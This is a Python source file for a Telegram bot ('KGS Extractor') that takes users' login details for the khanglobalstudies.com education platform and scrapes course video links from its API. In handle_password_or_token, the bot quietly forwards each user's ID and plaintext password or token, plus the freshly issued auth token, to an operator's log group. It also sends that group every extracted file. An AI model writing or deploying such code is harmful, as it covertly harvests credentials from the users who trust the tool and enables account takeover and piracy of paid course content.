import logging
import os
import requests
import time
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Conversation states
LOGIN_CHOICE, USER_ID, PASSWORD_OR_TOKEN, BATCH_SELECTION = range(4)

# Constants
ROOT_DIR = os.getcwd()

async def kgs_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the KGS extraction process."""
    if context.user_data.get('conversation_active', False):
        await update.message.reply_text("Ending previous conversation...")
        context.user_data.clear()
    
    context.user_data['conversation_active'] = True
    await update.message.reply_text(
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐊𝐆𝐒 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐨𝐫!\n\n"
        "Please enter your credentials in the following format:\n"
        "1️⃣ For ID and Password: `id*password`\n"
        "2️⃣ For Token: `token`\n\n"
        "Example:\n"
        "For ID and Password: `6969696969*password123`\n"
        "For Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`"
    )
    return LOGIN_CHOICE

async def handle_login_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the login credentials input."""
    try:
        input_text = update.message.text.strip()
        
        # Check if input is in the format id*password
        if '*' in input_text:
            user_id, password = input_text.split('*', 1)
            context.user_data['login_choice'] = '1'
            context.user_data['user_id'] = user_id
            context.user_data['password'] = password
        else:
            # Assume input is a token
            context.user_data['login_choice'] = '2'
            context.user_data['token'] = input_text

        # Delete the user's message containing credentials
        await update.message.delete()

        # Proceed with login
        return await handle_password_or_token(update, context)

    except Exception as e:
        logging.error(f"Error in handle_login_choice: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle password or token input and perform login."""
    try:
        headers = {
            "Host": "khanglobalstudies.com",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }

        # Log credentials to the log group using main bot
        log_group_id = context.application.log_group_id_kgs  # Get log group ID from context
        main_bot = context.application.main_bot  # Get main bot instance

        if context.user_data['login_choice'] == '1':
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"New KGS login attempt:\nUser ID: ```{context.user_data['user_id']}```\nPassword: ```{context.user_data['password']}```",
                parse_mode="Markdown"
            )
        else:
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"New KGS token login:\nUser ID: ```{context.user_data.get('user_id', 'N/A')}```\nToken: ```{context.user_data['token']}```",
                parse_mode="Markdown"
            )

        if context.user_data['login_choice'] == '1':
            # Login with ID and password
            login_url = "https://khanglobalstudies.com/api/login-with-password"
            data = {
                "phone": context.user_data['user_id'],
                "password": context.user_data['password'],
            }
            
            response = requests.post(login_url, headers=headers, data=data, timeout=30)
            
            if response.status_code != 200:
                await update.message.reply_text(f"Login failed! Server response: {response.text[:100]}...")
                return ConversationHandler.END
            
            try:
                response_data = response.json()
            except ValueError:
                await update.message.reply_text(f"Invalid JSON response: {response.text[:100]}")
                return ConversationHandler.END
            
            if "token" not in response_data:
                await update.message.reply_text("Login failed! Token not found in response.")
                return ConversationHandler.END

            token = response_data["token"]
            
            # Log token to the log group using main bot
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"KGS Login Success!\nUser ID: ```{context.user_data['user_id']}```\nGenerated Token: ```{token}```",
                parse_mode="Markdown"
            )
        else:
            # Direct token login
            token = context.user_data['token']

        # Store token and fetch batches
        context.user_data['token'] = token
        headers = {
            "Host": "khanglobalstudies.com",
            "authorization": f"Bearer {token}",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }
        
        course_response = requests.get(
            "https://khanglobalstudies.com/api/user/v2/courses",
            headers=headers,
            timeout=30
        )

        if course_response.status_code != 200:
            await update.message.reply_text(f"Failed to fetch batches. Status code: {course_response.status_code}")
            return ConversationHandler.END

        courses = course_response.json()
        context.user_data['courses'] = courses

        # Format batch information with token
        batch_text = f"𝐋𝐨𝐠𝐢𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥!\n\n𝙰𝚞𝚝𝚑 𝚃𝚘𝚔𝚎𝚗: ```{token}```\n\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐁𝐚𝐭𝐜𝐡𝐞𝐬:\n\n"
        
        if not courses:
            batch_text += "No batches found."
        else:
            for course in courses:
                batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{course['title']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{course['id']}```\n\n"

        await update.message.reply_text(
            f"{batch_text}\nPlease enter the Batch ID to proceed:",
            parse_mode="Markdown"
        )
        return BATCH_SELECTION
            
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"Error fetching courses: {str(e)}")
        return ConversationHandler.END

    except Exception as e:
        logging.error(f"Error in handle_password_or_token: {e}")
        await update.message.reply_text(f"An error occurred during login: {str(e)}")
        return ConversationHandler.END

async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle batch selection and extract content."""
    try:
        batch_id = update.message.text.strip()
        
        # Find selected batch
        selected_batch = next(
            (batch for batch in context.user_data['courses'] if str(batch['id']) == batch_id),
            None
        )
        
        if not selected_batch:
            await update.message.reply_text("Invalid Batch ID! Please try again.")
            return BATCH_SELECTION

        await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")

        start_time = time.time()  # Start time for extraction

        # Setup headers for API requests
        headers = {
            "Host": "khanglobalstudies.com",
            "authorization": f"Bearer {context.user_data['token']}",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }

        # Fetch lessons
        lessons_url = f"https://khanglobalstudies.com/api/user/courses/{batch_id}/v2-lessons"
        lessons_response = requests.get(lessons_url, headers=headers)
        
        if lessons_response.status_code != 200:
            await update.message.reply_text("Failed to fetch lessons. Please try again.")
            return ConversationHandler.END

        lessons = lessons_response.json()
        full_content = ""

        # Extract video URLs for each lesson
        for lesson in lessons:
            try:
                lesson_url = f"https://khanglobalstudies.com/api/lessons/{lesson['id']}"
                lesson_response = requests.get(lesson_url, headers=headers)
                lesson_data = lesson_response.json()

                videos = lesson_data.get("videos", [])
                for video in videos:
                    title = video.get("name", "Untitled").replace(":", " ")
                    video_url = video.get("video_url", "")
                    if video_url:
                        full_content += f"{title}: {video_url}\n"

            except Exception as e:
                logging.error(f"Error processing lesson {lesson['id']}: {e}")
                continue

        if full_content:
            filename = f"KGS_{selected_batch['title']}_{batch_id}.txt"
            file_path = os.path.join(ROOT_DIR, filename)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(full_content)

            # Calculate extraction time
            extraction_time = time.time() - start_time
            extraction_time_str = f"{extraction_time:.2f} seconds"

            # Send file to user
            user_caption = (
                f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n"
                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=user_caption
                )

            # Send file to log group using main bot
            log_group_id = context.application.log_group_id_kgs  # Get log group ID from context
            main_bot = context.application.main_bot  # Get main bot instance

            log_caption = (
                f"📥 **KGS Content Extracted:**\n"
                f"👤 **User ID:** `{update.message.from_user.id}`\n"
                f"📌 **Batch Name:** {selected_batch['title']}\n"
                f"⏱ **Extraction Time:** {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await main_bot.send_document(
                    chat_id=log_group_id,
                    document=f,
                    caption=log_caption
                )

            # Clean up
            os.remove(file_path)
            await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
            return ConversationHandler.END  # Ensure the conversation ends here after successful extraction

        else:
            await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
            return ConversationHandler.END  # End the conversation if no content is found

    except Exception as e:
        logging.error(f"Error in handle_batch_selection: {e}")
        await update.message.reply_text("An error occurred during content extraction. Please try again later.")
        return ConversationHandler.END

async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle conversation timeout."""
    await update.message.reply_text("Conversation timed out. Please start again.")
    context.user_data.clear()
    return ConversationHandler.END

# Create the conversation handler
kgs_handler = ConversationHandler(
    entry_points=[CommandHandler("kgs", kgs_start)],
    states={
        LOGIN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_login_choice)],
        BATCH_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_selection)],
    },
    fallbacks=[MessageHandler(filters.ALL, timeout)],  # Handle timeout
    conversation_timeout=600,  # 10 minutes timeout
)